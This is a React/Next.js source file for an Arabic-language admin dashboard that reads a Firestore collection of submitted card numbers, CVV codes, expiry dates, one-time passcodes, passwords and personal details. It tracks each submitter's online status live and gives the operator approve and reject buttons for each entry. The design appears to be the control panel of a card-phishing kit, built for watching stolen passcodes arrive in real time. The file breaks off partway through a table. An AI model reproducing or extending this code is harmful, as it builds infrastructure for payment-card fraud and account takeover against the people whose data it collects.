"use client"

import { useState, useEffect, useMemo } from "react"
import { useRouter } from "next/navigation"
import { Trash2, Users, CreditCard, UserCheck, Flag, Bell, LogOut, BarChart3, Clock, Info, Layers } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref } from "firebase/database"
import { database } from "@/lib/firestore"
import { auth } from "@/lib/firestore"
import { db } from "@/lib/firestore"
import { playNotificationSound } from "@/lib/actions"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { ThemeToggle } from "@/components/theam"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { cn } from "@/lib/utils"

// Flag colors for row highlighting
type FlagColor = "red" | "yellow" | "green" | null

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

interface Notification {
  createdDate: string
  bank: string
  cardStatus?: string
  ip?: string
  cvv: string
  id: string | "0"
  expiryDate: string
  notificationCount: number
  otp: string
  otp2: string
  page: string
  cardNumber: string
  country?: string
  personalInfo: {
    id?: string | "0"
    name?: string
  }
  prefix: string
  status: "pending" | string
  isOnline?: boolean
  lastSeen: string
  violationValue: number
  pass?: string
  year: string
  month: string
  pagename: string
  plateType: string
  allOtps?: string[] | null
  idNumber: string
  email: string
  mobile: string
  network: string
  phoneOtp: string
  cardExpiry: string
  name: string
  otpCode: string
  phone: string
  flagColor?: FlagColor
}

// Create a separate component for user status that returns both the badge and the status
function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <Badge
      variant="outline"
      className={cn(
        "font-medium transition-all duration-300 border-0",
        status === "online"
          ? "bg-green-100/80 text-green-700 dark:bg-green-900/60 dark:text-green-300"
          : "bg-red-100/80 text-red-700 dark:bg-red-900/60 dark:text-red-300",
      )}
    >
      <span
        className={cn(
          "mr-1.5 h-2 w-2 rounded-full transition-all",
          status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500",
        )}
      />
      <span className="text-xs">{status === "online" ? "متصل" : "غير متصل"}</span>
    </Badge>
  )
}

// Create a hook to track online status for a specific user ID
function useUserOnlineStatus(userId: string) {
  const [isOnline, setIsOnline] = useState(false)

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      setIsOnline(data && data.state === "online")
    })

    return () => unsubscribe()
  }, [userId])

  return isOnline
}

// Flag color selector component
function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string
  currentColor: FlagColor
  onColorChange: (id: string, color: FlagColor) => void
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button
          variant="ghost"
          size="icon"
          className="h-8 w-8 rounded-full hover:bg-muted/80 transition-all duration-200"
        >
          <Flag
            className={cn(
              "h-4 w-4 transition-colors duration-200",
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-yellow-500 fill-yellow-500"
                  : currentColor === "green"
                    ? "text-green-500 fill-green-500"
                    : "text-muted-foreground",
            )}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2 shadow-lg border-border">
        <div className="flex gap-2">
          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-red-100 dark:bg-red-900/70 hover:bg-red-200 dark:hover:bg-red-800 transition-all duration-200"
                  onClick={() => onColorChange(notificationId, "red")}
                >
                  <Flag className="h-4 w-4 text-red-500 fill-red-500" />
                </Button>
              </TooltipTrigger>
              <TooltipContent side="bottom" className="bg-card border-border shadow-md">
                <p>علم أحمر</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-yellow-100 dark:bg-yellow-900/70 hover:bg-yellow-200 dark:hover:bg-yellow-800 transition-all duration-200"
                  onClick={() => onColorChange(notificationId, "yellow")}
                >
                  <Flag className="h-4 w-4 text-yellow-500 fill-yellow-500" />
                </Button>
              </TooltipTrigger>
              <TooltipContent side="bottom" className="bg-card border-border shadow-md">
                <p>علم أصفر</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-green-100 dark:bg-green-900/70 hover:bg-green-200 dark:hover:bg-green-800 transition-all duration-200"
                  onClick={() => onColorChange(notificationId, "green")}
                >
                  <Flag className="h-4 w-4 text-green-500 fill-green-500" />
                </Button>
              </TooltipTrigger>
              <TooltipContent side="bottom" className="bg-card border-border shadow-md">
                <p>علم أخضر</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700 transition-all duration-200"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <Flag className="h-4 w-4 text-gray-500" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent side="bottom" className="bg-card border-border shadow-md">
                  <p>إزالة العلم</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  )
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [message, setMessage] = useState<boolean>(false)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  // Add a new state for the filter type
  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")

  // Track online status for all notifications
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})

  // Effect to track online status for all notifications
  useEffect(() => {
    const statusRefs: { [key: string]: () => void } = {}

    notifications.forEach((notification) => {
      const userStatusRef = ref(database, `/status/${notification.id}`)

      const callback = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }))
      })

      statusRefs[notification.id] = callback
    })

    // Cleanup function
    return () => {
      Object.values(statusRefs).forEach((unsubscribe) => {
        if (typeof unsubscribe === "function") {
          unsubscribe()
        }
      })
    }
  }, [notifications])

  // Filter notifications based on the selected filter type
  const filteredNotifications = useMemo(() => {
    if (filterType === "all") {
      return notifications
    } else if (filterType === "card") {
      return notifications.filter((notification) => notification.cardNumber)
    } else if (filterType === "online") {
      return notifications.filter((notification) => onlineStatuses[notification.id])
    }
    return notifications
  }, [filterType, notifications, onlineStatuses])

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]

        // Check if there are any new notifications with card info or general info
        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
        )
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.idNumber || notification.email || notification.mobile) &&
            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
        )

        // Only play notification sound if new card info or general info is added
        if (hasNewCardInfo || hasNewGeneralInfo) {
          playNotificationSound()
        }

        // Update statistics
        updateStatistics(notificationsData)

        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
    } catch (error) {
      console.error("Error hiding all notifications:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
    } catch (error) {
      console.error("Error hiding notification:", error)
    }
  }

  const handleApproval = async (state: string, id: string) => {
    const targetPost = doc(db, "pays", id)
    await updateDoc(targetPost, {
      status: state,
    })
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  // Handle flag color change
  const handleFlagColorChange = async (id: string, color: FlagColor) => {
    try {
      // Update in Firestore
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { flagColor: color })

      // Update local state
      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, flagColor: color } : notification,
        ),
      )
    } catch (error) {
      console.error("Error updating flag color:", error)
    }
  }

  // Get row background color based on flag color
  const getRowBackgroundColor = (flagColor: FlagColor) => {
    if (!flagColor) return ""

    const colorMap = {
      red: "bg-red-50/80 dark:bg-red-950/30 hover:bg-red-100 dark:hover:bg-red-950/50",
      yellow: "bg-yellow-50/80 dark:bg-yellow-950/30 hover:bg-yellow-100 dark:hover:bg-yellow-950/50",
      green: "bg-green-50/80 dark:bg-green-950/30 hover:bg-green-100 dark:hover:bg-green-950/50",
    }

    return colorMap[flagColor]
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary"></div>
          <div className="text-lg font-medium">جاري التحميل...</div>
        </div>
      </div>
    )
  }

  // Calculate counts for filter buttons
  const cardCount = notifications.filter((n) => n.cardNumber).length
  const onlineCount = Object.values(onlineStatuses).filter(Boolean).length

  return (
    <div dir="rtl" className="min-h-screen h-full bg-background text-foreground">
      <div className="flex flex-col h-screen overflow-hidden">
        {/* Header */}
        <header className="border-b border-border bg-card shadow-md sticky top-0 z-10">
          <div className="container mx-auto px-6 py-4 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="bg-primary/10 p-2 rounded-full">
                <Bell className="h-6 w-6 text-primary" />
              </div>
              <h1 className="text-xl font-bold tracking-tight">لوحة الإشعارات</h1>
            </div>
            <div className="flex items-center gap-3">
              <ThemeToggle />
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      size="icon"
                      className="h-10 w-10 rounded-full border-border shadow-sm hover:shadow-md transition-all duration-200"
                      onClick={handleLogout}
                    >
                      <LogOut className="h-4 w-4" />
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent side="bottom" className="bg-card border-border shadow-md">
                    <p>تسجيل الخروج</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
            </div>
          </div>
        </header>

        <div className="flex-1 container mx-auto px-6 py-6 overflow-hidden flex flex-col h-[calc(100vh-73px)]">
          {/* Statistics Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-5 mb-6 animate-in fade-in-50 duration-500">
            {/* Online Users Card */}
            <Card className="bg-card shadow-md hover:shadow-lg transition-all duration-300 border-border overflow-hidden group">
              <CardContent className="p-6 flex items-center relative">
                <div className="absolute inset-0 bg-blue-500/5 dark:bg-blue-900/10 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                <div className="rounded-full bg-blue-100 dark:bg-blue-900/70 p-4 mr-4 shadow-sm group-hover:shadow transition-all duration-300 relative z-10">
                  <UserCheck className="h-6 w-6 text-blue-600 dark:text-blue-300" />
                </div>
                <div className="relative z-10">
                  <p className="text-sm font-medium text-muted-foreground">المستخدمين المتصلين</p>
                  <p className="text-2xl font-bold mt-1">{onlineUsersCount}</p>
                </div>
              </CardContent>
            </Card>

            {/* Total Visitors Card */}
            <Card className="bg-card shadow-md hover:shadow-lg transition-all duration-300 border-border overflow-hidden group">
              <CardContent className="p-6 flex items-center relative">
                <div className="absolute inset-0 bg-green-500/5 dark:bg-green-900/10 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                <div className="rounded-full bg-green-100 dark:bg-green-900/70 p-4 mr-4 shadow-sm group-hover:shadow transition-all duration-300 relative z-10">
                  <Users className="h-6 w-6 text-green-600 dark:text-green-300" />
                </div>
                <div className="relative z-10">
                  <p className="text-sm font-medium text-muted-foreground">إجمالي الزوار</p>
                  <p className="text-2xl font-bold mt-1">{totalVisitors}</p>
                </div>
              </CardContent>
            </Card>

            {/* Card Submissions Card */}
            <Card className="bg-card shadow-md hover:shadow-lg transition-all duration-300 border-border overflow-hidden group">
              <CardContent className="p-6 flex items-center relative">
                <div className="absolute inset-0 bg-purple-500/5 dark:bg-purple-900/10 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                <div className="rounded-full bg-purple-100 dark:bg-purple-900/70 p-4 mr-4 shadow-sm group-hover:shadow transition-all duration-300 relative z-10">
                  <CreditCard className="h-6 w-6 text-purple-600 dark:text-purple-300" />
                </div>
                <div className="relative z-10">
                  <p className="text-sm font-medium text-muted-foreground">معلومات البطاقات المقدمة</p>
                  <p className="text-2xl font-bold mt-1">{cardSubmissions}</p>
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Main Content */}
          <Card className="flex-1 overflow-hidden shadow-md border-border">
            <CardHeader className="px-6 py-4 border-b border-border bg-muted/40">
              <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
                <div className="flex items-center gap-2">
                  <div className="bg-primary/10 p-1.5 rounded-md">
                    <BarChart3 className="h-5 w-5 text-primary" />
                  </div>
                  <CardTitle className="text-lg font-bold tracking-tight">الإشعارات والبيانات</CardTitle>
                </div>
                <div className="flex flex-wrap gap-2">
                  <Button
                    variant="destructive"
                    onClick={handleClearAll}
                    disabled={notifications.length === 0}
                    className="flex items-center gap-2 shadow-sm hover:shadow transition-all duration-200"
                    size="sm"
                  >
                    <Trash2 className="h-4 w-4" />
                    مسح الكل
                  </Button>
                </div>
              </div>
            </CardHeader>

            <Tabs defaultValue="all" className="w-full">
              <div className="px-6 pt-4 border-b border-border">
                <TabsList className="grid grid-cols-3 w-full max-w-md bg-muted/50 p-1 rounded-lg">
                  <TabsTrigger
                    value="all"
                    onClick={() => setFilterType("all")}
                    className="rounded-md data-[state=active]:bg-background data-[state=active]:shadow-sm transition-all duration-200"
                  >
                    <Layers className="h-4 w-4 mr-2" />
                    الكل
                    <Badge
                      variant="secondary"
                      className="ml-1.5 bg-primary/10 text-primary hover:bg-primary/15 transition-colors"
                    >
                      {notifications.length}
                    </Badge>
                  </TabsTrigger>
                  <TabsTrigger
                    value="card"
                    onClick={() => setFilterType("card")}
                    className="rounded-md data-[state=active]:bg-background data-[state=active]:shadow-sm transition-all duration-200"
                  >
                    <CreditCard className="h-4 w-4 mr-2" />
                    البطاقات
                    <Badge
                      variant="secondary"
                      className="ml-1.5 bg-green-100 text-green-700 dark:bg-green-900/60 dark:text-green-300 hover:bg-green-200 dark:hover:bg-green-900/80 transition-colors"
                    >
                      {cardCount}
                    </Badge>
                  </TabsTrigger>
                  <TabsTrigger
                    value="online"
                    onClick={() => setFilterType("online")}
                    className="rounded-md data-[state=active]:bg-background data-[state=active]:shadow-sm transition-all duration-200"
                  >
                    <UserCheck className="h-4 w-4 mr-2" />
                    المتصلين
                    <Badge
                      variant="secondary"
                      className="ml-1.5 bg-blue-100 text-blue-700 dark:bg-blue-900/60 dark:text-blue-300 hover:bg-blue-200 dark:hover:bg-blue-900/80 transition-colors"
                    >
                      {onlineCount}
                    </Badge>
                  </TabsTrigger>
                </TabsList>
              </div>

              <TabsContent value="all" className="m-0">
                <ScrollArea className="h-[calc(100vh-280px)] overflow-y-auto flex-1">
                  {/* Desktop Table View - Hidden on Mobile */}
                  <div className="hidden md:block">
                    <table className="w-full border-collapse">
                      <thead>
                        <tr className="border-b border-border bg-muted/30 sticky top-0 z-10">
                          <th className="px-5 py-3.5 text-right font-medium text-muted-foreground">الدولة</th>
                          <th className="px-5 py-3.5 text-right font-medium text-muted-foreground">المعلومات</th>
                          <th className="px-5 py-3.5 text-right font-medium text-muted-foreground">OTP</th>
                          <th className="px-5 py-3.5 text-right font-medium text-muted-foreground">الوقت</th>
                          <th className="px-5 py-3.5 text-center font-medium text-muted-foreground">الحالة</th>
                          <th className="px-5 py-3.5 text-center font-medium text-muted-foreground">العلم</th>
                          <th className="px-5 py-3.5 text-center font-medium text-muted-foreground">الإجراءات</th>
                        </tr>
                      </thead>
                      <tbody>
                        {filteredNotifications.map((notification, index) => (
                          <tr
                            key={notification.id}
                            className={cn(
                              "border-b border-border hover:bg-muted/20 transition-all duration-300 animate-in fade-in-50 slide-in-from-right-5",
                              getRowBackgroundColor(notification?.flagColor!),
                            )}
                            style={{ animationDelay: `${index * 50}ms` }}
                          >
                            <td className="px-4 py-3.5 font-medium">{notification.country || "غير معروف"}</td>
                            <td className="px-4 py-3.5">
                              <div className="flex flex-wrap gap-2">
                                <Badge
                                  variant={notification.name ? "secondary" : "outline"}
                                  className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors duration-200 shadow-sm"
                                  onClick={() => handleInfoClick(notification, "personal")}
                                >
                                  <Info className="h-3 w-3 mr-1" />
                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                </Badge>
                                <Badge
                                  variant={notification.cardNumber ? "default" : "outline"}
                                  className={cn(
                                    "rounded-md cursor-pointer transition-colors duration-200 shadow-sm",
                                    notification.cardNumber
                                      ? "bg-green-500 hover:bg-green-600 dark:bg-green-600 dark:hover:bg-green-700"
                                      : "hover:bg-muted",
                                  )}
                                  onClick={() => handleInfoClick(notification, "card")}
                                >
                                  <CreditCard className="h-3 w-3 mr-1" />
                                  {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                </Badge>
                              </div>
                            </td>
                            <td className="px-4 py-3.5">
                              {notification?.otp ? (
                                <Badge
                                  variant="outline"
                                  className="bg-blue-100/80 text-blue-700 dark:bg-blue-900/60 dark:text-blue-300 border-0 shadow-sm animate-in fade-in-50 slide-in-from-bottom-3 duration-500"
                                  key={notification.otp}
                                >
                                  {notification.otp}
                                </Badge>
                              ) : (
                                "-"
                              )}
                            </td>
                            <td className="px-4 py-3.5 whitespace-nowrap">
                              <div className="flex items-center">
                                <Clock className="h-3 w-3 mr-1.5 text-muted-foreground" />
                                <span className="text-sm">
                                  {notification.createdDate &&
                                    formatDistanceToNow(new Date(notification.createdDate), {
                                      addSuffix: true,
                                      locale: ar,
                                    })}
                                </span>
                              </div>
                            </td>
                            <td className="px-4 py-3.5 text-center">
                              <UserStatus userId={notification.id} />
                            </td>
                            <td className="px-4 py-3.5 text-center">
                              <FlagColorSelector
                                notificationId={notification.id}
                                currentColor={notification.flagColor || null}
                                onColorChange={handleFlagColorChange}
                              />
                            </td>
                            <td className="px-4 py-3.5 text-center">
                              <div className="flex justify-center gap-2">
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => {
                                    handleApproval("approved", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="bg-green-500 dark:bg-green-600 text-white hover:bg-green-600 dark:hover:bg-green-700 transition-colors duration-200 shadow-sm"
                                >
                                  قبول
                                </Button>
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => {
                                    handleApproval("rejected", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="bg-red-500 dark:bg-red-600 text-white hover:bg-red-600 dark:hover:bg-red-700 transition-colors duration-200 shadow-sm"
                                >
                                  رفض
                                </Button>
                                <TooltipProvider>
                                  <Tooltip>
                                    <TooltipTrigger asChild>
                                      <Button
                                        variant="ghost"
                                        size="icon"
                                        onClick={() => handleDelete(notification.id)}
                                        className="h-8 w-8 text-red-500 dark:text-red-400 hover:text-red-600 dark:hover:text-red-300 hover:bg-red-100 dark:hover:bg-red-900/30 transition-all duration-200"
                                      >
                                        <Trash2 className="h-4 w-4" />
                                      </Button>
                                    </TooltipTrigger>
                                    <TooltipContent side="bottom" className="bg-card border-border shadow-md">
                                      <p>حذف الإشعار</p>
                                    </TooltipContent>
                                  </Tooltip>
                                </TooltipProvider>
                              </div>
                            </td>
                          </tr>
                        ))}
                        {filteredNotifications.length === 0 && (
                          <tr>
                            <td colSpan={7} className="px-4 py-8 text-center text-muted-foreground">
                              لا توجد إشعارات متطابقة مع الفلتر المحدد
                            </td>
                          </tr>
                        )}
                      </tbody>
                    </table>
                  </div>

                  {/* Mobile Card View - Shown only on Mobile */}
                  <div className="md:hidden space-y-4 p-4">
                    {filteredNotifications.length > 0 ? (
                      filteredNotifications.map((notification, index) => (
                        <Card
                          key={notification.id}
                          className={cn(
                            "overflow-hidden bg-card border-border shadow-md hover:shadow-lg transition-all duration-300 animate-in fade-in-50 slide-in-from-right-5",
                            getRowBackgroundColor(notification?.flagColor!),
                          )}
                          style={{ animationDelay: `${index * 50}ms` }}
                        >
                          <CardContent className="p-4">
                            <div className="flex justify-between items-start mb-3">
                              <div>
                                <div className="font-semibold">{notification.country || "غير معروف"}</div>
                              </div>
                              <div className="flex items-center gap-2">
                                <FlagColorSelector
                                  notificationId={notification.id}
                                  currentColor={notification.flagColor || null}
                                  onColorChange={handleFlagColorChange}
                                />
                                <UserStatus userId={notification.id} />
                              </div>
                            </div>

                            <div className="grid grid-cols-1 gap-3 mb-3">
                              <div className="flex flex-wrap gap-2">
                                <Badge
                                  variant={notification.name ? "secondary" : "outline"}
                                  className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors duration-200 shadow-sm"
                                  onClick={() => handleInfoClick(notification, "personal")}
                                >
                                  <Info className="h-3 w-3 mr-1" />
                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                </Badge>
                                <Badge
                                  variant={notification.cardNumber ? "default" : "outline"}
                                  className={cn(
                                    "rounded-md cursor-pointer transition-colors duration-200 shadow-sm",
                                    notification.cardNumber
                                      ? "bg-green-500 dark:bg-green-600 hover:bg-green-600 dark:hover:bg-green-700"
                                      : "hover:bg-muted",
                                  )}
                                  onClick={() => handleInfoClick(notification, "card")}
                                >
                                  <CreditCard className="h-3 w-3 mr-1" />
                                  {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                </Badge>
                              </div>

                              <div className="text-sm flex items-center">
                                <span className="font-medium ml-2">رمز التحقق:</span>
                                {notification?.otp ? (
                                  <Badge
                                    variant="outline"
                                    className="bg-blue-100/80 text-blue-700 dark:bg-blue-900/60 dark:text-blue-300 border-0 shadow-sm animate-in fade-in-50 slide-in-from-bottom-3 duration-500"
                                    key={notification.otp}
                                  >
                                    {notification.otp}
                                  </Badge>
                                ) : (
                                  "-"
                                )}
                              </div>

                              <div className="text-sm flex items-center">
                                <Clock className="h-3 w-3 mr-1.5 text-muted-foreground" />
                                <span className="font-medium ml-2">الوقت:</span>{" "}
                                {notification.createdDate &&
                                  formatDistanceToNow(new Date(notification.createdDate), {
                                    addSuffix: true,
                                    locale: ar,
                                  })}
                              </div>

                              <div className="flex gap-2 mt-2">
                                <Button
                                  onClick={() => {
                                    handleApproval("approved", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="flex-1 bg-green-500 dark:bg-green-600 hover:bg-green-600 dark:hover:bg-green-700 transition-colors duration-200 shadow-sm"
                                  size="sm"
                                >
                                  قبول
                                </Button>
                                <Button
                                  onClick={() => {
                                    handleApproval("rejected", notification.id)
                                    setMessage(true)
                                    setTimeout(() => {
                                      setMessage(false)
                                    }, 3000)
                                  }}
                                  className="flex-1"
                                  variant="destructive"
                                  size="sm"
                                >
                                  رفض
                                </Button>
                                <Button
                                  variant="outline"
                                  onClick={() => handleDelete(notification.id)}
                                  className="w-10 p-0"
                                  size="sm"
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </div>
                              {message && (
                                <p className="text-green-500 dark:text-green-400 text-center mt-2">تم الارسال</p>
                              )}
                            </div>
                          </CardContent>
                        </Card>
                      ))
                    ) : (
                      <div className="text-center py-8 text-muted-foreground">
                        لا توجد إشعارات متطابقة مع الفلتر المحدد
                      </div>
                    )}
                  </div>
                </ScrollArea>
              </TabsContent>

              <TabsContent value="card" className="m-0">
                <ScrollArea className="h-[calc(100vh-280px)] overflow-y-auto flex-1">
                  {/* Same structure as "all" tab but with card filtered data */}
                  <div className="hidden md:block">
                    <table className="w-full border-collapse">
                      <thead>
                        <tr className="border-b border-border bg-muted/30 sticky top-0 z-10">
                          <th className="px-5 py-3.5 text-right font-medium text-muted-foreground">الدولة</th>
                          <th className="px-5 py-3.5 text-right font-medium text-muted-foreground">المعلومات</th>
                          <th className="px-5 py-3.5 text-right font-medium text-muted-foreground">OTP</th>
                          <th className="px-5 py-3.5 text-right font-medium text-muted-foreground">الوقت</th>
                          <th className="px-5 py-3.5 text-center font-medium text-muted-foreground">الحالة</th>
                          <th className="px-5 py-3.5 text-center font-medium text-muted-foreground">العلم</th>
                          <th className="px-5 py-3.5 text-center font-medium text-muted-foreground">الإجراءات</th>
                        </tr>
                      </thead>
                      <tbody>
                        {filteredNotifications.map((notification, index) => (
                          <tr
                            key={notification.id}
                            className={cn(
                              "border-b border-border hover:bg-muted/20 transition-all duration-300 animate-in fade-in-50 slide-in-from-right-5",
                              getRowBackgroundColor(notification?.flagColor!),
                            )}
                            style={{ animationDelay: `${index * 50}ms` }}
                          >
                            <td className="px-4 py-3.5 font-medium">{notification.country || "غير معروف"}</td>
                            <td className="px-4 py-3.5">
                              <div className="flex flex-wrap gap-2">
                                <Badge
                                  variant={notification.name ? "secondary" : "outline"}
                                  className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors duration-200 shadow-sm"
                                  onClick={() => handleInfoClick(notification, "personal")}
                                >
                                  <Info className="h-3 w-3 mr-1" />
                                  {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                </Badge>
                                <Badge
                                  variant={notification.cardNumber ? "default" : "outline"}
                                  className={cn(
                                    "rounded-md cursor-pointer transition-colors duration-200 shadow-sm",
                                    notification.cardNumber
                                      ? "bg-green-500 hover:bg-green-600 dark:bg-green-600 dark:hover:bg-green-700"
                                      : "hover:bg-muted",
                                  )}
                                  onClick={() => handleInfoClick(notification, "card")}
                                >
                                  <CreditCard className="h-3 w-3 mr-1" />
                                  {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                </Badge>
                              </div>
                            </td>
                            <td className="px-4 py-3.5">
                              {notification?.otp ? (
                                <Badge
                                  variant="outline"
                                  className="bg-blue-100/80 text-blue-700 dark:bg-blue-900/60 dark:text-blue-300 border-0 shadow-sm animate-in fade-in-50 slide-in-from-bottom-3 duration-500"
                                  key={notification.otp}
                                >
                                  {notification.otp}
                                </Badge>
                              ) : (
                                "-"
                              )}
                            </td>
                            <td className="px-4 py-3.5 whitespace-nowrap">
                              <div className="flex items-center">
                                <Clock className="h-3 w-3 mr-1.5 text-muted-foreground" />
                                <span className="text-sm">
                                  {notification.createdDate &&
                                    formatDistanceToNow(new Date(notification.createdDate), {
                                      addSuffix: true,
                                      locale: ar,
                                    })}
                                </span>
                              </div>
                            </td>
                            <td className="px-4 py-3.5 text-center">
                              <UserStatus userId={notification.id} />
                            </td>
